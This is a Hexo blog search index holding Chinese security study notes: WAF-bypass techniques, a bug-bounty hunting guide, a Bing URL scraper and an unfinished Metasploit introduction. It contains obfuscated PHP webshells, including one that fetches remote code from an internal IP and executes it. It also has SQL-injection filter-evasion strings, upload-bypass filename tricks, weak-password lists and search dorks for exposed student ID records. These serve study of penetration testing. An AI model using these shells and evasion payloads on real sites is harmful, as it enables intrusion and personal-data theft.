<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>waf_bypass</title>
      <link href="/posts/21d474c5.html"/>
      <url>/posts/21d474c5.html</url>
      
        <content type="html"><![CDATA[<h2 id="Waf绕过–cracer学习"><a href="#Waf绕过–cracer学习" class="headerlink" title="Waf绕过–cracer学习"></a>Waf绕过–cracer学习</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>1.<a href="#jump1">waf防护原理讲解</a></p><p>2.目录扫描绕过waf</p><p>3.特殊文件访问拦截bypass</p><p>4.命令执行函数被禁bypass</p><p>5.访问受限绕过</p><p>6.手工注入绕过waf</p><p>7.编码sqlmap绕过WAF tamper</p><p>8.webshell bypass WAF</p><p>9.一句话客户端bypass WAF</p><p>10.xss payload bypass</p><p>11.上传绕过WAF</p><p>12.MSF payload bypass</p><p>13.提取绕过WAF</p><h3 id="waf防护原理讲解"><a href="#waf防护原理讲解" class="headerlink" title="waf防护原理讲解"></a><span id="jump1">waf防护原理讲解</span></h3><h4 id="网站防护-safedog-云锁"><a href="#网站防护-safedog-云锁" class="headerlink" title="网站防护(safedog,云锁)"></a>网站防护(safedog,云锁)</h4><p><img src="https://s2.loli.net/2023/03/03/RxrU4VsZ72v1EYI.png" alt="image.png"></p><p>安全狗的防护等级是可以换的(默认初级)</p><p><img src="https://s2.loli.net/2023/03/03/4S9ynIshPdCkaKY.png" alt="image.png"></p><p>初级的安全狗虽然检测get,post,head请求，但是一般只对url也就是get请求进行拦截(如order by,union select……)</p><p><img src="https://s2.loli.net/2023/03/03/aeJfnK3hlMV42EA.png" alt="image.png"></p><p>针对工具的拦截主要是检测http头中的user-agent进行拦截</p><p>在利用工具扫描的时候需要修改user-agent来绕过拦截</p><h4 id="资源防护"><a href="#资源防护" class="headerlink" title="资源防护"></a>资源防护</h4><p><img src="https://s2.loli.net/2023/03/03/cj7Y1rFx9iSJzbp.png" alt="image.png"></p><p>网站后台防护:IP验证方式,密码验证方式</p><ul><li><p>密码验证:访问后台url弹窗要求输入密码</p><p>但是可以直接通过cookie进行绕过进入后台</p></li><li><p>IP验证:403(无权限)</p></li></ul><p>针对IP验证绕过:看拦截走的什么协议</p><p>http协议头获取的ip:</p><ul><li>remote_ip</li><li>x-forward-for</li><li>client-ip</li></ul><p>TCP协议:突破很难(钓鱼拿到管理员的电脑权限,开启socks代理进行登录)</p><h3 id="目录扫描绕过waf"><a href="#目录扫描绕过waf" class="headerlink" title="目录扫描绕过waf"></a>目录扫描绕过waf</h3><h4 id="拦截现象"><a href="#拦截现象" class="headerlink" title="拦截现象"></a>拦截现象</h4><p>扫描目录的时候被waf拦截</p><ul><li>扫描不到任何信息(ip被ban,一般是硬件防火墙(过滤流量)，<strong>阿里云</strong>)</li><li>扫描出来一堆信息(误报)(waf)</li></ul><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><ul><li><p>修改user-agent</p></li><li><p>减慢扫描速度</p></li><li><p>爬行工具爬取目录(爬行菜刀,robots,awvs,burpsuite)</p><p>比一般访问要快，但是并不是基于字典去爆破的</p></li><li><p>借助代理ip池(一个请求一个ip)</p><p>直接搜ip代理(免费，收费)</p></li><li><p>白名单服务器扫描(白名单ip)</p><p>用阿里云扫描阿里云的服务器</p></li></ul><h3 id="特殊文件访问绕过"><a href="#特殊文件访问绕过" class="headerlink" title="特殊文件访问绕过"></a>特殊文件访问绕过</h3><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ul><li>sql</li><li>mdb</li><li>rar</li></ul><h4 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>修改后缀加入垃圾字符打破匹配规则</p><p>加入垃圾字符长度过长，超过拦截长度绕过</p><ul><li><p>xx.sql.(文件后缀加个点)</p><p>xx.sql……………………………..(加一堆点,请求过长,安全狗waf不会去拦截)</p></li><li><p>xx.sql%00</p></li></ul><h3 id="命令执行函数被禁"><a href="#命令执行函数被禁" class="headerlink" title="命令执行函数被禁"></a>命令执行函数被禁</h3><h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><p>一般是linux服务器上，shell无法被调用</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>配合bypass_disablefunc.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_diablefunc_x64.so</span><br></pre></td></tr></table></figure><p>outpath:输出保存文件</p><p>sopath:库的路径</p><h3 id="访问受限绕过"><a href="#访问受限绕过" class="headerlink" title="访问受限绕过"></a>访问受限绕过</h3><h4 id="受限位置"><a href="#受限位置" class="headerlink" title="受限位置"></a>受限位置</h4><ul><li><p>后台访问</p><p>http协议</p></li><li><p>3389端口访问</p><p>tcp&#x2F;ip协议</p></li></ul><h4 id="绕过方式-2"><a href="#绕过方式-2" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>burpsuite插件fakeip</p><p><img src="https://s2.loli.net/2023/03/03/yIGPQRiLu7mD5cO.png" alt="image.png"></p><p>浏览器插件modify headers:修改http头</p><p>3389端口访问是做端口转发</p><h3 id="手工注入绕waf"><a href="#手工注入绕waf" class="headerlink" title="手工注入绕waf"></a>手工注入绕waf</h3><p>sql注入产生于代码，执行于数据库</p><h4 id="Waf分类"><a href="#Waf分类" class="headerlink" title="Waf分类"></a>Waf分类</h4><ul><li>safedog</li><li>d盾</li><li>云锁</li><li>阿里云盾</li><li>知道创云盾</li><li>长亭科技waf(具体名字不知,以公司代指)</li><li>天融信waf</li></ul><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul><li><p>大小写变种</p></li><li><p>SQL注释</p><p><img src="https://s2.loli.net/2023/03/03/wELjcydzSVhH1sJ.png" alt="image.png"></p><p>注释 – %23 %0a&#x2F;**&#x2F;</p><p>内联注释 &#x2F;<em>!</em>&#x2F;</p></li><li><p>URL编码</p></li><li><p>空字节</p></li><li><p>嵌套过剥离</p></li><li><p>非标准入口点</p></li><li><p>避开自定义过滤器</p></li><li><p><strong>变换提交方式</strong></p></li></ul><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><h5 id="安全狗特点"><a href="#安全狗特点" class="headerlink" title="安全狗特点"></a>安全狗特点</h5><p>如果url中存在注释符，可能安全狗就会默认后面被注释就不会检测了</p><p><strong>&#x2F;<em>!44444&#x2F;<em>select union %23 – select %0a</em>&#x2F;%0aunion</em>&#x2F;</strong></p><p>总结:写的要复杂,但也要写的写的语法合理正确</p><h5 id="提交非标准入口点"><a href="#提交非标准入口点" class="headerlink" title="提交非标准入口点"></a>提交非标准入口点</h5><p>baidu.com&#x2F;xx.asp?id&#x3D;123(参数为id)</p><p>baidu.com&#x2F;xx.asp?aid&#x3D;123%23&#x2F;<em>&amp;id&#x3D;123 and 1&#x3D;1&amp;bid&#x3D;122</em>&#x2F;</p><p>大概意思:</p><p>你访问的是一个不存在的aid，但是你将url提交到后面服务器，服务器只会去查id的值，并不管aid和bid的值</p><p><strong>总结:</strong></p><ul><li>提交另外的参数如cid</li><li>在cid后加%23(#),再加注释&#x2F;**&#x2F;,在注释符中输入真正要的参数id的值</li></ul><h5 id="内联注释-非标准入口点失效"><a href="#内联注释-非标准入口点失效" class="headerlink" title="内联注释(非标准入口点失效)"></a>内联注释(非标准入口点失效)</h5><p>?id&#x3D;13&#x2F;<em>!44444order</em>&#x2F;&#x2F;<em>!44444by</em>&#x2F;过不了咋办</p><p>?id&#x3D;13&#x2F;<em>!44444order</em>&#x2F;#%23&#x2F;<em>!44444%0aby</em>&#x2F;&#x2F;!44444%0a1*&#x2F;—&gt;13 order by 1</p><p><strong>总结:</strong></p><ul><li>利用非注释&#x2F;<em>!</em>&#x2F;以及内联注释</li><li>配合空白字符&#x2F;<em>%23select</em>&#x2F;%0a</li></ul><p>access:</p><ul><li><p>%0a,%a0,%%%%0a代替空格</p></li><li><p>%%%截断关键字 an%%%d 1%%%&#x3D;%%1(专门应用于access中的过滤的)</p></li><li><p>变换提交方式get-post-cookie</p></li><li><p>大小写 and aND</p></li><li><p>URL编码</p><p>and 1&#x3D;1 —&gt; and%201%3d1</p></li></ul><p>mysql:</p><ul><li>&#x2F;**&#x2F; – #注释</li><li>&#x2F;**&#x2F;代替空格</li><li>&#x2F;<em>!</em>&#x2F;:非注释</li><li>&#x2F;<em>!1111 and 1&#x3D;1</em>&#x2F;</li></ul><h3 id="Webshell-bypass"><a href="#Webshell-bypass" class="headerlink" title="Webshell bypass"></a>Webshell bypass</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ul><li>一句话过waf</li><li>一句话客户端过waf</li><li>提权—上大马(代码量大,难躲)(大马免杀)</li></ul><h4 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h4><h5 id="一句话过waf"><a href="#一句话过waf" class="headerlink" title="一句话过waf"></a>一句话过waf</h5><p><strong>动态传参马</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;e&#x27;</span><br><span class="line">$b=&#x27;v&#x27;</span><br><span class="line">$c=&#x27;l&#x27;</span><br><span class="line">$x=$a.$b.$_GET[&#x27;x&#x27;].$c;</span><br><span class="line">$x($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>假设上述代码为x.php</p><p>则x.php?x&#x3D;a</p><p>$x&#x3D;eval($_POST[x])但是php内部并未出现任何eval字段</p><p>如果所有的工具包括菜刀,蚁剑,哥斯拉都被拦截了,那么只能尝试对大马进行上传并进行免杀</p><p>大马免杀:</p><p>base64加密</p><p>如果免杀过的大马还是过不掉，使用站马分离</p><p>对网站上传一句话，访问一句话去远程调用别的服务器的代码文件去执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;m&#x27;</span><br><span class="line">$m=file_get_contents(&quot;http://192.168.0.100/1.txt&quot;);</span><br><span class="line">preg_replace(&quot;/_/e&quot;,$$a,&quot;_&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>(<a href="https://cloud.tencent.com/developer/article/1371906">https://cloud.tencent.com/developer/article/1371906</a>)</p><p>(<a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">https://blog.csdn.net/weixin_43749601/article/details/113417093</a>)</p><h5 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h5><ul><li><p>长度绕过(增加垃圾长度)</p><p>位置:</p><p>Content Disposition: form-data;name&#x3D;”upfile”;filename&#x3D;”1.php”</p><ul><li>for+++++++++++++++m-data</li><li>;123123123121321313;filename&#x3D;”1.php”</li></ul></li><li><p>文件名称引号不对称</p><ul><li>filename&#x3D;”1.php’或者”1.php(引号非闭合)</li></ul></li><li><p>文件名 多个&#x3D;号</p><p>filename&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;”1.php”</p></li><li><p>文件名称里面添加分号或者垃圾字符</p><p>filename&#x3D;”1 x&amp;ssdad; 1.php”</p></li><li><p>文件名换行</p><ul><li><p>filename&#x3D;</p><p>“1.php”</p></li><li><p>filename</p><p>&#x3D;”1.php”</p></li><li><p>filename&#x3D;”1.</p><p>php”</p></li></ul></li><li><p>删除banner信息</p><p>form-data</p></li><li><p>在filepath(文件路径)中进行截断</p></li></ul><h3 id="XSS-payload-WAF"><a href="#XSS-payload-WAF" class="headerlink" title="XSS payload WAF"></a>XSS payload WAF</h3><p>换标签调用js代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus&gt;</span><br><span class="line">&lt;img src&gt;</span><br></pre></td></tr></table></figure><h3 id="MSF-payload-bypass"><a href="#MSF-payload-bypass" class="headerlink" title="MSF payload bypass"></a>MSF payload bypass</h3><ul><li><p>shellter免杀</p><p>shellterproject.com</p></li><li><p>go免杀</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公益src</title>
      <link href="/posts/bd0e7455.html"/>
      <url>/posts/bd0e7455.html</url>
      
        <content type="html"><![CDATA[<h2 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2><h4 id="谷歌语法"><a href="#谷歌语法" class="headerlink" title="谷歌语法"></a>谷歌语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">寻找sql注入</span><br><span class="line">公司inurl:php?id=</span><br><span class="line">公司inurl:asp?id=</span><br><span class="line">公司inurl:aspx?id=</span><br><span class="line">广州inurl:php?id= #添加地区进行筛选(省、市)</span><br><span class="line">医药inurl:php?id #行业进行筛选</span><br><span class="line">保险inurl:php?id</span><br><span class="line">银行inurl:php?id</span><br><span class="line">酒店inurl:php?id</span><br><span class="line"></span><br><span class="line">xss,sql</span><br><span class="line">inurl:search?kw=</span><br><span class="line">inurl:Product.asp?BigClassName</span><br></pre></td></tr></table></figure><p>参数也可以是tid、keyword之类的其他参数(平时挖掘的时候注意收集)</p><p>比如我们在使用google语法查询的时候进入了一个url为list.php?id的页面，之后我们可以选择使用list.php?id来作为谷歌语法再次进行筛选查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">弱口令及越权,找后台</span><br><span class="line"></span><br><span class="line">inurl:后台</span><br><span class="line">后台inurl:php</span><br><span class="line">后台inurl:asp</span><br><span class="line">后台inurl:aspx</span><br><span class="line">后台site:edu.cn  #中文+域名格式</span><br></pre></td></tr></table></figure><p>asp与aspx的后台可能存在越权漏洞，可以尝试禁用js然后直接访问后台url,大概率能够直接进入</p><h4 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;php?id=&quot; &amp;&amp; country=&quot;CN&quot;</span><br><span class="line">&quot;asp?id=&quot; &amp;&amp; country=&quot;CN&quot;</span><br><span class="line">&quot;aspx?id=&quot; &amp;&amp; country=&quot;CN&quot;</span><br><span class="line">server==&quot;Apache&quot;</span><br></pre></td></tr></table></figure><p>如果想高速上分，可以去找CMS通杀漏洞，只需验证即可</p><p>一般配合漏洞库:peiyi文库，白阁文库，cnvd</p><h4 id="漏洞选择"><a href="#漏洞选择" class="headerlink" title="漏洞选择"></a>漏洞选择</h4><p>1.sql注入</p><p>sqlmap批量跑url(批量是只能单线程)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#细致但时间长</span><br><span class="line">sqlmap -m url.txt --level 3 --risk2 --batch --dbs</span><br><span class="line">#效率高</span><br><span class="line">sqlmap -m url.txt --batch --dbs</span><br></pre></td></tr></table></figure><p>2.弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号:admin/test/cs/ceshi/test01</span><br><span class="line">密码:admin/123456/a123456/admin123/admin123456</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin 密码： admin/admin123/123456</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;后台管理&quot; &amp;&amp; country=&quot;CN&quot;</span><br></pre></td></tr></table></figure><p>3.cms通杀</p><p>​配合漏洞库进行操作</p><p>4.敏感信息收集&#x2F;泄漏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">学号 身份证 site:edu.cn filetype:xls</span><br></pre></td></tr></table></figure><p>敏感信息如果没有造成较大危害是不收的(即使出了身份证和银行卡号，没啥利用价值也不会收)</p><p><strong>目录遍历,除非访问敏感文件，一般要能访问源码才会收</strong></p><h4 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h4><p>1.AWVS</p><p>2.APPScan</p><p>3.Xray</p><p>4.BBScan</p><p>xray和BBScan适合扫描敏感信息和普通漏洞</p><p>APPScan和AWVS扫描结果全但是存在误报</p><h4 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h4><p>1.fofa</p><p>2.shodan</p><p>3.zoomeye</p><h2 id="报告提交"><a href="#报告提交" class="headerlink" title="报告提交"></a>报告提交</h2><p>网站备案信息查询:<a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p><p>假如一些小站点无法通过站长之家查询到备案信息，可以通过以下网址:</p><p>爱企查:<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1、IP域名归属"><a href="#1、IP域名归属" class="headerlink" title="1、IP域名归属"></a>1、IP域名归属</h5><p>截图站长之家</p><h5 id="2、漏洞页"><a href="#2、漏洞页" class="headerlink" title="2、漏洞页"></a>2、漏洞页</h5><p>截图漏洞主页</p><h5 id="3、具体操作实现"><a href="#3、具体操作实现" class="headerlink" title="3、具体操作实现"></a>3、具体操作实现</h5><h5 id="4、注入结果截图"><a href="#4、注入结果截图" class="headerlink" title="4、注入结果截图"></a>4、注入结果截图</h5><p>可以新建一个记事本，里面写好一些框架，节省提交时间</p><h2 id="拿分技巧"><a href="#拿分技巧" class="headerlink" title="拿分技巧"></a>拿分技巧</h2><h4 id="分数"><a href="#分数" class="headerlink" title="分数"></a>分数</h4><p>低危漏洞2分<br>中危漏洞3分<br>高危漏洞4分</p><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>尽量别挖反射型XSS,存在降级风险</p><p>一般提交的漏洞会在一两天之内审核完，如果一两天之后发现自己的漏洞没有被审核，那就是自己的漏洞被压下去了，审核员还没审核到你的漏洞，只有提交多一点，把别人的漏洞压下去，才可能成为制胜关键</p><p>优秀的报告积分翻倍，差的报告积分减半</p><p>审核员能复现出来的报告一般都是良好，正常拿分</p><h4 id="优秀报告"><a href="#优秀报告" class="headerlink" title="优秀报告"></a>优秀报告</h4><p><img src="https://nc0.cdn.zkaq.cn/md/8794/269671bf335bc034db9878d2b1760668_37191.png" alt="img"></p><p>漏洞简述一般分三点:</p><p>1.漏洞概述</p><p>2.漏洞成因</p><p>3.漏洞危害</p><p>修复建议:</p><p>尽量写的好一点，细一点</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://zhuanlan.zhihu.com/p/420252726">https://zhuanlan.zhihu.com/p/420252726</a></p><p><a href="https://www.freebuf.com/articles/web/265782.html">https://www.freebuf.com/articles/web/265782.html</a></p>]]></content>
      
      
      <categories>
          
          <category> src </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>github_action自动部署</title>
      <link href="/posts/c121ad9d.html"/>
      <url>/posts/c121ad9d.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;update&quot;</span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean:清楚旧数据</span><br><span class="line">hexo g:本地生成新文件</span><br><span class="line">hexo s:开启本地服务器测试</span><br><span class="line">hexo d:发布</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bing_search</title>
      <link href="/posts/d0eda161.html"/>
      <url>/posts/d0eda161.html</url>
      
        <content type="html"><![CDATA[<h3 id="Python实现bing批量url收集"><a href="#Python实现bing批量url收集" class="headerlink" title="Python实现bing批量url收集"></a>Python实现bing批量url收集</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>苦于手工收集url良久,虽不怕吃苦,但是属实枯燥乏味,遂小学python爬虫,终实现成功(不算完美)</p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">headers = &#123;</span><br><span class="line">&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.46&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url=&#x27;https://cn.bing.com/search?q=&#x27;</span><br><span class="line">q=input(&#x27;Please input the content you want to search:&#x27;)</span><br><span class="line">url=url+q</span><br><span class="line">#print(url)</span><br><span class="line">#response = requests.get(url).text</span><br><span class="line">#print(response)</span><br><span class="line"></span><br><span class="line">def get_links(url):</span><br><span class="line">    txt_file = open(&quot;./bing_search.txt&quot;, &quot;a&quot;, encoding=&quot;utf-8&quot;)  # 以写的格式打开先打开文件</span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    soup = BeautifulSoup(res.text, &#x27;html.parser&#x27;)  # html.parser是个html解析器</span><br><span class="line">    # print(soup.prettify()) #标准化代码格式 推进</span><br><span class="line">    p = soup.find_all(&#x27;cite&#x27;)</span><br><span class="line">    #print(p)</span><br><span class="line">    p1 = soup.select(&#x27;div &gt; cite&#x27;)</span><br><span class="line">    #print(p1)  p1是个列表</span><br><span class="line">    for p2 in p1:</span><br><span class="line">        print(p2.get_text()) </span><br><span class="line">        #print(p2.get(&#x27;cite&#x27;)) </span><br><span class="line">        txt_file.write(p2.get_text())</span><br><span class="line">        txt_file.write(&quot;\n&quot;)</span><br><span class="line">    txt_file.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">   numbers = [1,10,20,30,40,50,60,70,80,90,100]</span><br><span class="line">   for number in numbers:</span><br><span class="line">       urls=url</span><br><span class="line">       urls = urls+&#x27;&amp;first=&#x27;+str(number)</span><br><span class="line">       #print(urls)</span><br><span class="line">       get_links(urls)</span><br></pre></td></tr></table></figure><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>暂时无法通过技术或者逻辑判断来确定搜索的页面数,只能固定numbers的范围,如果能够动态获取就更好了</p><h4 id="改善"><a href="#改善" class="headerlink" title="改善"></a>改善</h4><p>1.加入多线程</p><p>2.加入其他搜索引擎</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf_introduction</title>
      <link href="/posts/1fa180ce.html"/>
      <url>/posts/1fa180ce.html</url>
      
        <content type="html"><![CDATA[<h3 id="Metasploit-Introduction"><a href="#Metasploit-Introduction" class="headerlink" title="Metasploit:Introduction"></a>Metasploit:Introduction</h3><h4 id="Introduction-to-Metasploit"><a href="#Introduction-to-Metasploit" class="headerlink" title="Introduction to Metasploit"></a>Introduction to Metasploit</h4><p>Metasploit 是应用最广泛的开发框架。Metasploit 是一个强大的工具，可以支持渗透测试的所有阶段，从信息收集到后期开发。Metasploit 框架是一组允许信息收集、扫描、利用、开发、后期利用等的工具。虽然 Metasploit 框架的主要用途集中在渗透测试领域，但它也有助于漏洞研究和开发。</p><p>Metasploit 有两个主要版本:</p><p>Metasploit Pro: <strong>促进任务自动化和管理的商业版。这个版本有一个图形用户界面(GUI)。</strong></p><p>Metasploit Framework: 从命令行工作的开源版本。这个房间将关注这个版本，它安装在 AtackBox 和最常用的 Linux 发行版渗透测试上。</p><p>The main components of the Metasploit Framework can be summarized as follows:</p><ul><li><strong>msfconsole</strong>: The main command-line interface.</li><li><strong>Modules</strong>: supporting modules such as exploits, scanners, payloads, etc.</li><li><strong>Tools</strong>: Stand-alone tools that will help <strong>vulnerability research, vulnerability assessment, or penetration testing</strong>. Some of these tools are <strong>msfvenom, pattern_create and pattern_offset</strong>. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.</li></ul><h4 id="Main-Components-of-Metasploit"><a href="#Main-Components-of-Metasploit" class="headerlink" title="Main Components of Metasploit"></a>Main Components of Metasploit</h4><p>The console(控制台) will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack.</p><p><strong>Exploit</strong>(利用): 使用目标系统上存在的漏洞的一段代码。</p><p><strong>Vulnerability</strong>(漏洞): 影响目标系统的设计、编码或逻辑缺陷。利用漏洞可能导致泄露机密信息或允许攻击者在目标系统上执行代码。</p><p><strong>Payload</strong>(有效载荷): 一个漏洞会利用一个漏洞。但是，<strong>如果我们希望利用有我们想要的结果(获得访问目标系统，阅读机密信息等</strong>) ，我们需要使用有效负载。有效载荷是将在目标系统上运行的代码。</p><p><strong>Auxiliary(辅助模块): Any supporting module, such as scanners, crawlers and fuzzers, can be found here.</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/aaeb4ff4aa7fc33289b2bb581d874f16.png" alt="img"></p><p><strong>Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.</strong></p><p>Signature-based antivirus and security solutions have a database of known threats.(基于签名的防病毒和安全解决方案有一个已知威胁的数据库) They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.</p><p><strong>Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.</strong>(绕过杀毒软件)</p><p>On the other hand, “evasion” modules will try that, with more or less success.</p><p><strong>Exploits: Exploits, neatly organized by target system.</strong></p><p><strong>Payloads: Payloads are codes that will run on the target system.</strong></p><p>Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.</p><p>Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a “shell”. Metasploit offers the ability to send different payloads that can open shells on the target system.</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a4c9a90b50c7c46a6c8c1a5f78500ad1.png" alt="img"></p><p>You will see three different directories under payloads: singles, stagers and stages.</p><ul><li><strong>Singles:</strong> Self-contained payloads (add user, launch notepad.exe, etc.) that <strong>do not need to download an additional component</strong> to run.</li><li><strong>Stagers:</strong> Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.</li><li><strong>Stages:</strong> Downloaded by the stager. This will allow you to use larger sized payloads.</li></ul><p>Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged 